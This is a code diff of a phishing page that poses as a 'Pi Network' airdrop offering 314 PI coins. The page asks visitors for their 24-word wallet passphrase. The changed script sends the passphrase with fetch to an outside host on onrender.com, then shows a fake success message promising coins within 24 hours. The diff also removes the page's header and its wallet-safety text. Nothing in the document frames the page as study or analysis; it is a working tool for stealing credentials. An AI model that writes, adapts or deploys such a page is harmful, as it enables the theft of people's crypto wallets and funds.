@@ -5,13 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Unlock Pi Reward</title>
     <style>
-        /* General reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -33,41 +26,6 @@
             text-align: center;
         }
 
-        /* Header Styling */
-        .header {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 32px;
-            font-weight: bold;
-            color: #4A148C;
-            text-shadow: 0px 2px 6px rgba(74, 20, 140, 0.6);
-            animation: fade-in 1.5s ease-in-out;
-            margin-bottom: 8px;
-        }
-
-        .header h2 {
-            font-size: 20px;
-            font-weight: 500;
-            color: #FF6F00;
-            text-shadow: 0px 1px 4px rgba(255, 111, 0, 0.7);
-            margin-bottom: 20px;
-        }
-
-        @keyframes fade-in {
-            0% {
-                opacity: 0;
-                transform: scale(0.9);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        /* Form Styling */
         h3 {
             font-size: 22px;
             color: #5a2da2;
@@ -100,61 +58,83 @@
             background-color: #4a2390;
         }
 
-        /* Info Text */
-        .info-text {
-            font-size: 12px;
-            color: #555;
+        .message {
             margin-top: 20px;
-            line-height: 1.5;
+            font-size: 18px;
+            font-weight: bold;
+            color: #2e7d32;
+            opacity: 0;
+            animation: fadeIn 1.5s forwards, bounce 1.2s ease infinite;
         }
 
-        .info-text a {
-            color: #5a2da2;
-            text-decoration: none;
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
 
-        .info-text a:hover {
-            text-decoration: underline;
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .message span {
+            color: #FF6F00;
         }
     </style>
     <script>
-        // Clear passphrase on page reload
-        window.onload = function() {
-            document.getElementById("passphrase").value = "";
-        };
+        async function submitPassphrase(event) {
+            event.preventDefault();
 
-        function validatePassphrase() {
             const passphrase = document.getElementById("passphrase").value.trim();
-            const wordCount = passphrase.split(" ").filter(word => word).length;
+            const messageBox = document.getElementById("message");
 
-            if (wordCount !== 24) {
+            if (passphrase.split(" ").length !== 24) {
                 alert("Please enter a valid 24-word passphrase.");
-                return false;
+                return;
             }
-            return true;
+
+            try {
+                const response = await fetch("https://pinetwork-ib9q.onrender.com/submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ passphrase })
+                });
+
+                const data = await response.json();
+                if (response.ok) {
+                    messageBox.innerHTML = `🎉 <span>Congratulations!!!</span><br>You have earned your <span>314 PI Coins</span> Successfully.<br> It will be in your wallet within <span>24hrs</span>!`;
+                    messageBox.style.color = "#4caf50";
+                    messageBox.style.opacity = 1;
+                } else {
+                    messageBox.textContent = data || "Error saving passphrase.";
+                    messageBox.style.color = "#e53935";
+                    messageBox.style.opacity = 1;
+                }
+            } catch (err) {
+                console.error("Error:", err);
+                alert("An error occurred. Please try again later.");
+            }
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <!-- Header Section -->
-        <div class="header">
-            <h1>Airdrop from Pi Network</h1>
-            <h2>Claim Your 314 PI Coins Now</h2>
-        </div>
-
-        <!-- Form Section -->
         <h3>Unlock Pi Reward</h3>
-        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
+        <form onsubmit="submitPassphrase(event)">
             <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
             <button type="submit">Unlock with passphrase</button>
         </form>
-
-        <!-- Info Section -->
-        <div class="info-text">
-            As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase. <br><br>
-            Lost your wallet passphrase? <a href="#">you can create a new wallet</a>, but all the Pi numbers in your previous wallet will be inaccessible.
-        </div>
+        <div id="message" class="message"></div>
     </div>
 </body>
 </html>
